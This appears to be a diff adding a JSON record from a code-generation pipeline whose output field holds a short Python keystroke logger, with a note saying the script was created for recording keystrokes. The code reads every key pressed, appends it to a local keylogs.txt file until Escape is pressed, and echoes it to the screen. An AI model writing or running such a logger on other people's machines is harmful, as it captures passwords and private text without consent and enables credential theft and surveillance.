@@ -1,0 +1,6 @@
+{
+  "output": "\nimport keyboard\n\nwith open('keylogs.txt', 'a') as f:\n    while True:\n        key = keyboard.read_key()\n        if key == '\\x1b':\n            break\n        if key.isprintable():\n            f.write(key)\n        else:\n            f.write('[' + key + ']')\n        print(key, end='')\n",
+  "notes": "Created Python script for recording keystrokes",
+  "applied_fixes": [],
+  "iterations": 1
+}
